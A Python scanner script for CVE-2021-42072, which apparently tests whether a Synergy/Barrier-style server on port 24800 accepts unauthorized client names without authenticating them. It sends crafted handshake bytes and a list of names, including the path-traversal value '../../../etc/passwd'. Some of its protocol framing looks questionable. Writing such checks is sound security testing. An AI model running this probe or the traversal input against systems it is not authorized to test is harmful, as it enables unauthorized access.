#!/usr/bin/env python3
"""
CVE-2021-42072: Authentication Bypass Scanner
Checks if the server verifies client identity properly
"""

import socket
import binascii
import time
import ssl
from utils import create_ssl_context, frame_message, normalize_host

def scan(host, port=24800):
    """Test for CVE-2021-42072 authentication bypass"""
    host = normalize_host(host)
    context = create_ssl_context()

    try:
        with socket.create_connection((host, port), timeout=10.0) as sock:
            ssock = context.wrap_socket(sock, server_hostname=host)
            ssock.settimeout(5.0)
            
            hello = b"\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08"
            print(f"Sending hello: {binascii.hexlify(hello).decode()}")
            ssock.sendall(hello)
            
            response = ssock.recv(4096)
            if not response:
                print("Failed to establish connection - no response")
                return
            print(f"Got hello response: {binascii.hexlify(response).decode()}")
            
            barrier = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x42\x61\x72\x72\x69\x65\x72\x00\x01\x00\x08test\x00"
            print(f"Sending barrier hello: {binascii.hexlify(barrier).decode()}")
            ssock.sendall(barrier)

            try:
                response = ssock.recv(4096)
                if response:
                    print(f"Got barrier response: {binascii.hexlify(response).decode()}")
            except socket.timeout:
                print("No barrier response (timeout)")
                
            calv = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CALV\x00"
            ssock.sendall(calv)
            time.sleep(0.5)

            test_names = [
                b"",
                b"test", 
                b"Unnamed",
                b"admin",
                b"../../../etc/passwd",
                b"synergy",
                b"deskflow",
                b"Synergy",
                b"Deskflow",
                b"SYNERGY",
                b"DESKFLOW"
            ]
            for name in test_names:
                try:
                    name_msg = frame_message(b"\x00\x01\x00\x08" + name + b"\x00")
                    print(f"\nTrying client name: {name}")
                    ssock.sendall(name_msg)
                    
                    response = ssock.recv(4096)
                    if response:
                        print(f"Response: {binascii.hexlify(response).decode()}")
                        if not b"EUNK" in response and not b"EBSY" in response:
                            print(f"[!] WARNING: Server accepted unauthorized client name: {name}")
                except:
                    continue
                
                time.sleep(0.5)

    except Exception as e:
        print(f"Connection error: {e}")
        if "connection refused" in str(e).lower():
            print("Make sure the server is running and the port is correct")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='CVE-2021-42072 Authentication Bypass Scanner')
    parser.add_argument('--host', required=True, help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=24800, help='Target port (default: 24800)')
    args = parser.parse_args()
    
    scan(args.host, args.port)